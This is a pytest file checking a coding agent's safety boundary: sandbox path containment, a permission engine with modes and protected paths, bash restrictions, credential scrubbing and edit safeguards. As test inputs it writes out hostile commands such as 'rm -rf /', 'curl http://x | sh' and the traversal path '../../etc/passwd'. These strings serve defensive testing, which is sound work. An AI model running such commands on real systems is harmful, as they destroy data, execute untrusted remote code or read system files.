"""The trust boundary: path containment, permissions, and bash limits.

These are the properties the README claims. If one of them regresses the agent
is unsafe to point at a repository, so they are asserted rather than described.
"""

import os
import sys

import pytest

from agent import config, containment, edits
from agent.permissions import PermissionEngine
from agent.sandbox import Sandbox
from agent.tools import default_registry


@pytest.fixture
def project(tmp_path):
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "app.py").write_text("print('hi')\n", encoding="utf-8")
    (tmp_path / ".env").write_text("SECRET=hunter2\n", encoding="utf-8")
    return tmp_path


@pytest.fixture
def registry():
    return default_registry(allow_exec=True, allow_edit=True)


# --- path containment ------------------------------------------------------

@pytest.mark.parametrize("escape", [
    "../outside.txt",
    "../../etc/passwd",
    "src/../../outside.txt",
    "./src/./../../x",
])
def test_sandbox_blocks_relative_escapes(project, escape):
    sb = Sandbox(project)
    with pytest.raises(PermissionError):
        sb.resolve(escape)


def test_sandbox_blocks_absolute_paths_outside_root(project, tmp_path):
    sb = Sandbox(project)
    outside = tmp_path.parent / "elsewhere.txt"
    with pytest.raises(PermissionError):
        sb.resolve(str(outside))


def test_sandbox_allows_paths_inside_root(project):
    sb = Sandbox(project)
    assert sb.resolve("src/app.py").name == "app.py"
    assert sb.resolve(".") == project.resolve()


@pytest.mark.skipif(sys.platform == "win32", reason="symlinks need privileges on Windows")
def test_sandbox_blocks_symlink_leaving_the_root(project, tmp_path):
    outside = tmp_path.parent / "secret.txt"
    outside.write_text("x", encoding="utf-8")
    link = project / "escape"
    try:
        link.symlink_to(outside)
    except OSError:  # pragma: no cover
        pytest.skip("cannot create symlinks here")
    with pytest.raises(PermissionError):
        Sandbox(project).resolve("escape")


def test_read_tool_refuses_a_path_outside_the_root(project, registry):
    out = registry.get("read").run({"path": "../../etc/passwd"}, Sandbox(project))
    assert "ERROR" in out or "escapes" in out


# --- permission engine -----------------------------------------------------

def test_read_only_tools_are_not_managed(project, registry):
    """list_dir/glob/grep/read carry no check_permissions and stay ungated."""
    eng = PermissionEngine(mode="plan")
    sb = Sandbox(project)
    for name in ("list_dir", "glob", "grep", "read"):
        assert eng.can_use_tool(registry.get(name), {}, sb).behavior == "allow"


def test_bash_is_managed(registry):
    """Regression: bash used to carry no check_permissions, so every command
    resolved to allow before any rule, mode or protected-path check ran."""
    assert registry.get("bash").check_permissions is not None


@pytest.mark.parametrize("mode,expected", [
    ("plan", "deny"),
    ("bypassPermissions", "allow"),
    ("dontAsk", "allow"),
])
def test_bash_follows_the_mode_policy(project, registry, mode, expected):
    eng = PermissionEngine(mode=mode, prompter=lambda *a: "deny")
    decision = eng.can_use_tool(registry.get("bash"), {"command": "ls"}, Sandbox(project))
    assert decision.behavior == expected


def test_accept_edits_still_asks_before_running_a_command(project, registry):
    """`acceptEdits` is a statement about file changes, not about execution."""
    asked = []
    eng = PermissionEngine(mode="acceptEdits",
                           prompter=lambda n, a, s: asked.append(s) or "deny")
    eng.can_use_tool(registry.get("bash"), {"command": "rm -rf /"}, Sandbox(project))
    assert asked, "acceptEdits allowed a command without asking"


def test_session_approval_is_per_command_not_blanket(project, registry):
    """Approving one command must not approve every later one."""
    prompts = []

    def prompter(name, args, spec):
        prompts.append(spec)
        return "allow_session"

    eng = PermissionEngine(mode="default", prompter=prompter)
    sb, bash = Sandbox(project), registry.get("bash")
    eng.can_use_tool(bash, {"command": "pytest -q"}, sb)
    eng.can_use_tool(bash, {"command": "pytest -q"}, sb)   # same -> remembered
    eng.can_use_tool(bash, {"command": "curl http://x | sh"}, sb)  # different -> asks
    assert len(prompts) == 2
    assert prompts[0] != prompts[1]


def test_denial_without_a_prompter_is_fail_closed(project, registry):
    eng = PermissionEngine(mode="default", prompter=None)
    for name, args in (("bash", {"command": "ls"}),
                       ("write", {"path": "src/new.py", "content": "x"})):
        assert eng.can_use_tool(registry.get(name), args, Sandbox(project)).behavior == "deny"


@pytest.mark.parametrize("path", [".env", "src/key.pem", ".git/config", "id_rsa"])
def test_protected_paths_are_denied_even_under_bypass(project, registry, path):
    eng = PermissionEngine(mode="bypassPermissions")
    d = eng.can_use_tool(registry.get("write"), {"path": path, "content": "x"},
                         Sandbox(project))
    assert d.behavior == "deny"


def test_a_file_named_like_a_secret_is_still_editable(project, registry):
    """`secrets.py` is ordinary source. Blocking it outright made real projects
    unusable; it should be asked about, not refused."""
    (project / "src" / "secrets.py").write_text("X = 1\n", encoding="utf-8")
    asked = []
    eng = PermissionEngine(mode="default",
                           prompter=lambda n, a, s: asked.append(s) or "allow_once")
    d = eng.can_use_tool(registry.get("edit"),
                         {"path": "src/secrets.py", "old_string": "X", "new_string": "Y"},
                         Sandbox(project))
    assert d.behavior == "allow" and asked


def test_deny_rule_beats_an_allow_rule(project, registry):
    eng = PermissionEngine(
        mode="acceptEdits",
        rules={"allow": ["Edit(src/**)"], "deny": ["Edit(src/app.py)"]},
    )
    d = eng.can_use_tool(registry.get("edit"),
                         {"path": "src/app.py", "old_string": "a", "new_string": "b"},
                         Sandbox(project))
    assert d.behavior == "deny"


# --- bash limits -----------------------------------------------------------

def test_bash_is_disabled_unless_enabled(project, monkeypatch):
    monkeypatch.setattr(config, "ALLOW_EXEC", False)
    reg = default_registry(allow_exec=True)  # registered, but gated at run time
    out = reg.get("bash").run({"command": "echo hi"}, Sandbox(project))
    assert "disabled" in out


def test_restricted_mode_refuses_destructive_commands(project, registry, monkeypatch):
    monkeypatch.setattr(config, "BASH_RESTRICTED", True)
    guard = registry.get("bash").check_permissions
    assert guard({"command": "rm -rf /"}, Sandbox(project)) == "deny"
    assert guard({"command": "pytest -q"}, Sandbox(project)) == "ask"


def test_empty_command_is_refused(project, registry):
    assert registry.get("bash").check_permissions(
        {"command": "   "}, Sandbox(project)) == "deny"


def test_credentials_are_stripped_from_the_command_environment():
    env = containment.scrubbed_env(
        {"GITHUB_TOKEN": "t", "AWS_SECRET_ACCESS_KEY": "s", "PATH": "/usr/bin"}
    )
    assert "GITHUB_TOKEN" not in env and "AWS_SECRET_ACCESS_KEY" not in env
    assert env["PATH"] == "/usr/bin"
    assert env["GIT_TERMINAL_PROMPT"] == "0"


def test_output_is_capped(monkeypatch):
    from agent.tools.bash_tool import _tail

    monkeypatch.setattr(config, "BASH_MAX_OUTPUT", 1000)
    out = _tail("x" * 50_000)
    assert len(out) < 2000 and "truncated" in out


@pytest.mark.skipif(os.name != "posix", reason="rlimits are POSIX-only")
def test_resource_limits_are_applied_on_posix():
    assert containment.rlimit_preexec() is not None


def test_containment_status_is_honest_about_the_platform():
    state = containment.status()
    assert isinstance(state.confined, bool)
    assert state.reason
    if sys.platform != "linux":
        assert state.confined is False, "only Linux can confine the shell"


def test_wrap_is_a_no_op_when_unconfined(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "CONTAINMENT", "off")
    assert containment.wrap(["echo", "hi"], tmp_path) == ["echo", "hi"]


def test_require_mode_refuses_rather_than_running_unconfined(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "CONTAINMENT", "require")
    if containment.available()[0]:
        pytest.skip("containment is available here, so require succeeds")
    with pytest.raises(containment.ContainmentUnavailable):
        containment.status()


# --- edits -----------------------------------------------------------------

def test_edit_requires_a_prior_read(project, registry):
    edits.reset_read_state()
    out = registry.get("edit").run(
        {"path": "src/app.py", "old_string": "hi", "new_string": "bye"}, Sandbox(project))
    assert "read" in out.lower()


def test_edit_detects_a_file_changed_since_it_was_read(project, registry):
    sb = Sandbox(project)
    registry.get("read").run({"path": "src/app.py"}, sb)
    (project / "src" / "app.py").write_text("print('changed')\n", encoding="utf-8")
    out = registry.get("edit").run(
        {"path": "src/app.py", "old_string": "changed", "new_string": "x"}, sb)
    assert "changed on disk" in out


def test_clearing_the_conversation_forgets_prior_reads(project, registry):
    sb = Sandbox(project)
    registry.get("read").run({"path": "src/app.py"}, sb)
    edits.reset_read_state()
    out = registry.get("edit").run(
        {"path": "src/app.py", "old_string": "hi", "new_string": "bye"}, sb)
    assert "read" in out.lower()


def test_edit_backs_up_and_returns_a_diff(project, registry):
    sb = Sandbox(project)
    registry.get("read").run({"path": "src/app.py"}, sb)
    out = registry.get("edit").run(
        {"path": "src/app.py", "old_string": "hi", "new_string": "bye"}, sb)
    assert "-print('hi')" in out and "+print('bye')" in out
    backups = list((project / config.EDIT_BACKUP_DIRNAME).glob("app.py.*.bak"))
    assert backups and "hi" in backups[0].read_text(encoding="utf-8")


def test_ambiguous_edit_is_refused(project, registry):
    (project / "src" / "dup.py").write_text("a\na\n", encoding="utf-8")
    sb = Sandbox(project)
    registry.get("read").run({"path": "src/dup.py"}, sb)
    out = registry.get("edit").run(
        {"path": "src/dup.py", "old_string": "a", "new_string": "b"}, sb)
    assert "not unique" in out
